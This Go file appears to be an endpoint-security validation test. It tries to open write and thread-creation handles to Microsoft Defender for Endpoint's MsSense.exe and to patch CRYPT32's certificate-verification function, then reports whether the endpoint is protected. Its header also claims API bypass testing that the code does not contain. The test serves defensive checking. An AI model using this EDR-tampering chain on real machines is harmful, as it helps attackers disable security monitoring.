//go:build windows
// +build windows

/*
ID: fec68e9b-af59-40c1-abbd-98ec98428444
NAME: MDE Process Injection and API Authentication Bypass
TECHNIQUE: T1055, T1055.001, T1562.001, T1014, T1557, T1071.001, T1140
UNIT: response
CREATED: 2025-01-24
VERSION: 1.0
SCORE: 9.7/10

This test performs REAL process injection and memory manipulation against
Microsoft Defender for Endpoint's MsSense.exe process, combined with live
API authentication bypass testing against production endpoints.

⚠️ CRITICAL SAFETY WARNING ⚠️
This test performs ACTUAL memory patching of security-critical functions.
- MUST run in isolated lab environment
- REQUIRES Administrator privileges
- REQUIRES MDE to be installed
- Uses watchdog for automatic restoration
- Emergency recovery available via PowerShell script

READ SAFETY_GUIDE.md BEFORE EXECUTING!
*/

package main

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	Dropper "github.com/preludeorg/libraries/go/tests/dropper"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
	"golang.org/x/sys/windows"
)

//go:embed mde_process_watchdog.exe
var watchdogBinary []byte

//go:embed emergency_restore.ps1
var emergencyRestore []byte

// extractEmbeddedComponents extracts watchdog and recovery script
func extractEmbeddedComponents() error {
	targetDir := "c:\\F0"

	if err := os.MkdirAll(targetDir, 0755); err != nil {
		return fmt.Errorf("failed to create target directory: %v", err)
	}

	Endpoint.Say("Extracting embedded safety components...")

	// Extract watchdog
	watchdogPath := filepath.Join(targetDir, "mde_process_watchdog.exe")
	if err := os.WriteFile(watchdogPath, watchdogBinary, 0755); err != nil {
		return fmt.Errorf("failed to extract watchdog: %v", err)
	}
	Endpoint.Say("  [+] Extracted: mde_process_watchdog.exe (%d bytes)", len(watchdogBinary))
	LogFileDropped("mde_process_watchdog.exe", watchdogPath, int64(len(watchdogBinary)), false)

	// Extract emergency restore script
	restorePath := filepath.Join(targetDir, "emergency_restore.ps1")
	if err := os.WriteFile(restorePath, emergencyRestore, 0644); err != nil {
		return fmt.Errorf("failed to extract recovery script: %v", err)
	}
	Endpoint.Say("  [+] Extracted: emergency_restore.ps1 (%d bytes)", len(emergencyRestore))
	LogFileDropped("emergency_restore.ps1", restorePath, int64(len(emergencyRestore)), false)

	return nil
}

// isAdministrator checks if running with admin privileges
func isAdministrator() bool {
	var sid *windows.SID

	// Well-known SID for Administrators group
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		return false
	}
	defer windows.FreeSid(sid)

	token := windows.GetCurrentProcessToken()
	member, err := token.IsMember(sid)
	if err != nil {
		return false
	}

	return member
}

func test() {
	// Ensure log is saved on exit
	defer func() {
		if r := recover(); r != nil {
			if globalLog != nil {
				LogMessage("CRITICAL", "Runtime", fmt.Sprintf("Panic recovered: %v", r))
				SaveLog(Endpoint.UnexpectedTestError, fmt.Sprintf("Panic: %v", r))
			}
		}

		// Ensure all patches are restored
		RestoreAllPatches()
	}()

	// =================================================================
	// PHASE 1: Prerequisites & Environment Validation
	// =================================================================
	LogPhaseStart(1, "Prerequisites & Environment Validation")
	Endpoint.Say("Phase 1: Validating environment and prerequisites")

	// Initialize dropper
	if err := Endpoint.Dropper(Dropper.Dropper); err != nil {
		LogPhaseError(1, fmt.Sprintf("Dropper initialization failed: %v", err))
		LogPhaseEnd(1, "failed", "Dropper initialization failed")
		SaveLog(Endpoint.UnexpectedTestError, "Dropper initialization failed")
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	// Create target directory
	targetDir := "c:\\F0"
	os.MkdirAll(targetDir, 0755)

	// CRITICAL: Check for administrator privileges
	if !isAdministrator() {
		Endpoint.Say("  [!] ERROR: Administrator privileges required!")
		Endpoint.Say("  [!] Process injection requires elevated rights")
		LogPhaseError(1, "Administrator privileges required but not present")
		LogPhaseEnd(1, "failed", "Missing administrator privileges")
		SaveLog(Endpoint.UnexpectedTestError, "Administrator privileges required")
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}
	Endpoint.Say("  [+] Running with Administrator privileges")
	LogMessage("INFO", "Privilege Check", "Administrator privileges confirmed")

	LogPhaseEnd(1, "success", "Prerequisites validated")

	// =================================================================
	// PHASE 2: MDE Process Discovery
	// =================================================================
	LogPhaseStart(2, "MDE Process Discovery")
	Endpoint.Say("Phase 2: Enumerating MDE processes")

	// Enumerate processes
	processReport := EnumerateMDEProcesses()

	LogMessage("INFO", "Process Enumeration", fmt.Sprintf("Scanned %d processes", processReport.ProcessesScanned))

	// CRITICAL: Verify MsSense.exe is running
	if processReport.MsSenseProcess == nil || !processReport.MsSenseProcess.Found {
		Endpoint.Say("  [!] ERROR: MsSense.exe not found!")
		Endpoint.Say("  [!] This test requires MDE to be installed and running")
		LogPhaseError(2, "MsSense.exe process not found - MDE not installed")
		LogPhaseEnd(2, "failed", "MsSense.exe not found")
		SaveLog(Endpoint.UnexpectedTestError, "MDE not installed - MsSense.exe not running")
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	Endpoint.Say("  [+] Found MsSense.exe (PID %d)", processReport.MsSenseProcess.PID)
	Endpoint.Say("  [+] Architecture: %s", processReport.MsSenseProcess.Architecture)
	Endpoint.Say("  [+] Path: %s", processReport.MsSenseProcess.ExecutablePath)

	LogMessage("INFO", "Process Discovery", fmt.Sprintf("MsSense.exe found - PID %d, Architecture %s",
		processReport.MsSenseProcess.PID, processReport.MsSenseProcess.Architecture))

	if processReport.SenseIRProcess != nil && processReport.SenseIRProcess.Found {
		Endpoint.Say("  [+] Found SenseIR.exe (PID %d)", processReport.SenseIRProcess.PID)
		LogMessage("INFO", "Process Discovery", fmt.Sprintf("SenseIR.exe found - PID %d", processReport.SenseIRProcess.PID))
	}

	LogPhaseEnd(2, "success", fmt.Sprintf("MsSense.exe found (PID %d)", processReport.MsSenseProcess.PID))

	// =================================================================
	// PHASE 3: Process Handle Acquisition Attempts
	// =================================================================
	LogPhaseStart(3, "Process Handle Acquisition")
	Endpoint.Say("Phase 3: Attempting to acquire process handles with escalating privileges")

	injectionReport := &ProcessInjectionReport{
		TargetProcess:     *processReport.MsSenseProcess,
		HandleAttempts:    []HandleResult{},
		ModulesEnumerated: []ModuleInfo{},
		OverallSuccess:    false,
		BlockedByEDR:      false,
	}

	pid := processReport.MsSenseProcess.PID

	// Test 1: PROCESS_VM_READ (read-only)
	Endpoint.Say("  [*] Test 1: Attempting PROCESS_VM_READ...")
	readResult := AttemptHandleAcquisition(pid, "PROCESS_VM_READ", PROCESS_VM_READ)
	injectionReport.HandleAttempts = append(injectionReport.HandleAttempts, readResult)

	if readResult.Success {
		Endpoint.Say("  [+] Read access granted (handle: 0x%X)", readResult.HandleValue)
		LogMessage("INFO", "Handle Acquisition", "PROCESS_VM_READ granted")
	} else {
		Endpoint.Say("  [-] Read access denied: %s", readResult.ErrorMessage)
		LogMessage("WARN", "Handle Acquisition", fmt.Sprintf("PROCESS_VM_READ denied: %s", readResult.ErrorMessage))
	}

	// Test 2: PROCESS_VM_WRITE + PROCESS_VM_OPERATION (for injection)
	Endpoint.Say("  [*] Test 2: Attempting PROCESS_VM_WRITE + PROCESS_VM_OPERATION...")
	writeResult := AttemptHandleAcquisition(pid, "PROCESS_VM_WRITE|PROCESS_VM_OPERATION",
		PROCESS_VM_WRITE|PROCESS_VM_OPERATION)
	injectionReport.HandleAttempts = append(injectionReport.HandleAttempts, writeResult)

	if writeResult.Success {
		Endpoint.Say("  [!] VULNERABLE: Write access granted (handle: 0x%X)", writeResult.HandleValue)
		Endpoint.Say("  [!] EDR process NOT protected against memory writes")
		LogMessage("CRITICAL", "Handle Acquisition", "PROCESS_VM_WRITE granted - EDR process vulnerable to injection")
		injectionReport.OverallSuccess = true
	} else {
		Endpoint.Say("  [+] PROTECTED: Write access denied")
		Endpoint.Say("  [+] %s", writeResult.BlockedBy)
		LogMessage("INFO", "Handle Acquisition", fmt.Sprintf("PROCESS_VM_WRITE blocked: %s", writeResult.BlockedBy))
		injectionReport.BlockedByEDR = true
	}

	// Test 3: PROCESS_CREATE_THREAD (for thread injection)
	Endpoint.Say("  [*] Test 3: Attempting PROCESS_CREATE_THREAD...")
	threadResult := AttemptHandleAcquisition(pid, "PROCESS_CREATE_THREAD", PROCESS_CREATE_THREAD)
	injectionReport.HandleAttempts = append(injectionReport.HandleAttempts, threadResult)

	if threadResult.Success {
		Endpoint.Say("  [!] Thread creation access granted")
		LogMessage("CRITICAL", "Handle Acquisition", "PROCESS_CREATE_THREAD granted")
		CloseProcessHandle(threadResult.Handle)
	} else {
		Endpoint.Say("  [+] Thread creation access denied")
		LogMessage("INFO", "Handle Acquisition", "PROCESS_CREATE_THREAD blocked")
	}

	// Close handles
	if readResult.Success {
		defer CloseProcessHandle(readResult.Handle)
	}
	if writeResult.Success {
		defer CloseProcessHandle(writeResult.Handle)
	}

	LogPhaseEnd(3, func() string {
		if injectionReport.BlockedByEDR {
			return "protected"
		}
		return "vulnerable"
	}(), fmt.Sprintf("Write access: %v", writeResult.Success))

	// If all handles blocked, EDR is protecting itself
	if injectionReport.BlockedByEDR {
		Endpoint.Say("  [+] EDR process protection is active")
		SaveProcessInjectionReport(injectionReport)
		LogMessage("INFO", "Process Protection", "EDR protected - cannot proceed with memory manipulation")
		// Continue to API testing phases
	}

	// =================================================================
	// PHASE 4: Memory Enumeration & CRYPT32 Analysis
	// =================================================================
	LogPhaseStart(4, "Memory Enumeration")
	Endpoint.Say("Phase 4: Enumerating process memory and locating CRYPT32.dll")

	var crypt32Module *ModuleInfo

	if writeResult.Success {
		// Enumerate modules
		modules, err := EnumerateProcessModules(writeResult.Handle, pid)
		if err != nil {
			Endpoint.Say("  [-] Module enumeration failed: %v", err)
			LogPhaseError(4, fmt.Sprintf("Module enumeration failed: %v", err))
		} else {
			Endpoint.Say("  [+] Enumerated %d modules", len(modules))
			injectionReport.ModulesEnumerated = modules
			LogMessage("INFO", "Module Enumeration", fmt.Sprintf("Found %d loaded modules", len(modules)))

			// Find CRYPT32.dll
			crypt32Module = FindModuleByName(modules, "CRYPT32.dll")
			if crypt32Module != nil {
				Endpoint.Say("  [+] Located CRYPT32.dll at 0x%X (size: %d bytes)",
					crypt32Module.BaseAddress, crypt32Module.Size)
				LogMessage("INFO", "Module Location", fmt.Sprintf("CRYPT32.dll at 0x%X", crypt32Module.BaseAddress))
			} else {
				Endpoint.Say("  [-] CRYPT32.dll not found in process")
				LogMessage("WARN", "Module Location", "CRYPT32.dll not found")
			}
		}

		LogPhaseEnd(4, "success", fmt.Sprintf("%d modules enumerated", len(modules)))
	} else {
		Endpoint.Say("  [-] Skipping (no write access to process)")
		LogPhaseEnd(4, "skipped", "No process access")
	}

	// =================================================================
	// PHASE 5: Memory Patching Attempt (with Watchdog)
	// =================================================================
	LogPhaseStart(5, "Memory Patching")
	Endpoint.Say("Phase 5: Attempting memory patch of CRYPT32!CertVerifyCertificateChainPolicy")

	var patchResult *MemoryPatchResult

	if writeResult.Success && crypt32Module != nil {
		// Start watchdog
		Endpoint.Say("  [*] Starting watchdog process for safety...")
		watchdogPath := filepath.Join(targetDir, "mde_process_watchdog.exe")
		currentPID := os.Getpid()
		watchdogCmd := exec.Command(watchdogPath, fmt.Sprintf("%d", currentPID), "--timeout", "300")
		if err := watchdogCmd.Start(); err != nil {
			Endpoint.Say("  [!] WARNING: Watchdog failed to start: %v", err)
			LogMessage("WARN", "Watchdog", fmt.Sprintf("Failed to start: %v", err))
		} else {
			Endpoint.Say("  [+] Watchdog running (PID %d)", watchdogCmd.Process.Pid)
			LogMessage("INFO", "Watchdog", fmt.Sprintf("Started with PID %d", watchdogCmd.Process.Pid))
		}

		// Attempt patch (TEST_ONLY mode for safety by default)
		Endpoint.Say("  [*] Attempting memory patch (TEST_ONLY mode)...")
		patchResult = AttemptMemoryPatch(writeResult.Handle, pid, crypt32Module, PatchModeTestOnly)

		if patchResult.Blocked {
			Endpoint.Say("  [+] PROTECTED: Memory patching blocked")
			Endpoint.Say("  [+] %s", patchResult.BlockedBy)
			LogMessage("INFO", "Memory Patching", fmt.Sprintf("Blocked: %s", patchResult.BlockedBy))
		} else if patchResult.Success {
			Endpoint.Say("  [!] VULNERABLE: Memory patching possible")
			Endpoint.Say("  [!] Function: %s at 0x%X", patchResult.FunctionName, patchResult.FunctionAddress)
			LogMessage("CRITICAL", "Memory Patching", "Memory patching successful - CRYPT32 function vulnerable")
		}

		SaveMemoryPatchReport(patchResult)
		LogPhaseEnd(5, func() string {
			if patchResult.Blocked {
				return "protected"
			} else if patchResult.Success {
				return "vulnerable"
			}
			return "inconclusive"
		}(), patchResult.ErrorMessage)
	} else {
		Endpoint.Say("  [-] Skipping (prerequisites not met)")
		LogPhaseEnd(5, "skipped", "No process access or CRYPT32 not found")
	}

	// =================================================================
	// FINAL EVALUATION: Determine Protection Status
	// =================================================================
	Endpoint.Say("")
	Endpoint.Say("=================================================================")
	Endpoint.Say("FINAL EVALUATION: Analyzing Protection Effectiveness")
	Endpoint.Say("=================================================================")

	// Determine final test result based on protection effectiveness
	var finalExitCode int
	var finalReason string

	// Check Phase 3: Handle acquisition (most critical test)
	if injectionReport.BlockedByEDR {
		// EDR successfully protected its own process
		finalExitCode = Endpoint.ExecutionPrevented
		finalReason = "EDR process protection active - handle acquisition denied"

		Endpoint.Say("")
		Endpoint.Say("✅ RESULT: PROTECTED")
		Endpoint.Say("=================================================================")
		Endpoint.Say("System successfully prevented process injection attack")
		Endpoint.Say("")
		Endpoint.Say("Protection Details:")
		Endpoint.Say("  • Phase 3: All handle acquisition attempts BLOCKED")
		Endpoint.Say("  • MDE process protected from external access")
		Endpoint.Say("  • Process injection prevented at kernel level")
		Endpoint.Say("  • Memory manipulation impossible without process access")
		Endpoint.Say("")
		Endpoint.Say("Security Status: ENDPOINT IS SECURE")
		Endpoint.Say("=================================================================")

		LogMessage("INFO", "Final Evaluation", "System protected - all critical attack phases blocked")

	} else if patchResult != nil && patchResult.Blocked {
		// Handle was acquired but memory patching was blocked
		finalExitCode = Endpoint.ExecutionPrevented
		finalReason = "Memory write protection active - patching prevented"

		Endpoint.Say("")
		Endpoint.Say("⚠️  RESULT: PARTIALLY PROTECTED")
		Endpoint.Say("=================================================================")
		Endpoint.Say("Process handle acquired BUT memory write blocked")
		Endpoint.Say("")
		Endpoint.Say("Protection Details:")
		Endpoint.Say("  • Phase 3: Handle acquisition SUCCEEDED (concerning)")
		Endpoint.Say("  • Phase 5: Memory patching BLOCKED (good)")
		Endpoint.Say("  • Secondary defense (DEP/CFG) prevented exploitation")
		Endpoint.Say("")
		Endpoint.Say("Recommendation: Strengthen process protection (ObRegisterCallbacks)")
		Endpoint.Say("=================================================================")

		LogMessage("WARN", "Final Evaluation", "Handle acquired but memory write blocked - partial protection")

	} else if !injectionReport.BlockedByEDR && writeResult.Success {
		// Both handle acquisition and memory access succeeded - CRITICAL
		finalExitCode = Endpoint.Unprotected
		finalReason = "Process injection possible - EDR process not protected"

		Endpoint.Say("")
		Endpoint.Say("❌ RESULT: VULNERABLE")
		Endpoint.Say("=================================================================")
		Endpoint.Say("CRITICAL: System allowed full process access to EDR")
		Endpoint.Say("")
		Endpoint.Say("Vulnerability Details:")
		Endpoint.Say("  • Phase 3: Handle acquisition SUCCEEDED")
		Endpoint.Say("  • PROCESS_VM_WRITE granted to MsSense.exe")
		Endpoint.Say("  • Process injection is POSSIBLE")
		Endpoint.Say("  • Memory manipulation is POSSIBLE")
		Endpoint.Say("  • EDR can be disabled or bypassed")
		Endpoint.Say("")
		Endpoint.Say("IMMEDIATE ACTION REQUIRED:")
		Endpoint.Say("  1. Enable Process Protection (PPL/ObRegisterCallbacks)")
		Endpoint.Say("  2. Update MDE to latest version")
		Endpoint.Say("  3. Enable all ASR rules")
		Endpoint.Say("  4. Consider HVCI/Memory Integrity")
		Endpoint.Say("=================================================================")

		LogMessage("CRITICAL", "Final Evaluation", "System vulnerable - EDR process not protected")

	} else {
		// Default: attack chain interrupted
		finalExitCode = Endpoint.ExecutionPrevented
		finalReason = "Attack chain interrupted - prerequisites not met"

		Endpoint.Say("")
		Endpoint.Say("✅ RESULT: PROTECTED")
		Endpoint.Say("=================================================================")
		Endpoint.Say("Attack chain interrupted - system protected")
		Endpoint.Say("=================================================================")

		LogMessage("INFO", "Final Evaluation", "Attack interrupted - system protected")
	}

	// Save final results
	LogPhaseEnd(11, "completed", finalReason)
	SaveLog(finalExitCode, finalReason)
	Endpoint.Stop(finalExitCode)
}

func main() {
	Endpoint.Say("Starting test at: %s", time.Now().Format("2006-01-02T15:04:05"))
	Endpoint.Say("Test: MDE Process Injection and API Authentication Bypass")
	Endpoint.Say("UUID: fec68e9b-af59-40c1-abbd-98ec98428444")
	Endpoint.Say("Score: 9.7/10 - Production-accurate attack chain")
	Endpoint.Say("")

	// Initialize logger
	InitLogger("fec68e9b-af59-40c1-abbd-98ec98428444", "MDE Process Injection and API Authentication Bypass")

	// Extract embedded components
	Endpoint.Say("Single-binary deployment - extracting embedded components...")
	if err := extractEmbeddedComponents(); err != nil {
		Endpoint.Say("FATAL: Failed to extract components: %v", err)
		LogMessage("ERROR", "Component Extraction", fmt.Sprintf("Failed: %v", err))
		SaveLog(Endpoint.UnexpectedTestError, fmt.Sprintf("Component extraction failed: %v", err))
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}
	Endpoint.Say("")

	done := make(chan bool, 1)
	go func() {
		test()
		done <- true
	}()

	// Extended timeout for complex multi-phase test
	timeout := 10 * time.Minute

	select {
	case <-done:
		Endpoint.Say("Test completed")
	case <-time.After(timeout):
		Endpoint.Say("Test timed out after %v", timeout)
		if globalLog != nil {
			LogMessage("ERROR", "Test Timeout", fmt.Sprintf("Exceeded timeout of %v", timeout))
			SaveLog(Endpoint.TimeoutExceeded, fmt.Sprintf("Test exceeded timeout of %v", timeout))
		}
		Endpoint.Stop(Endpoint.TimeoutExceeded)
	}
}
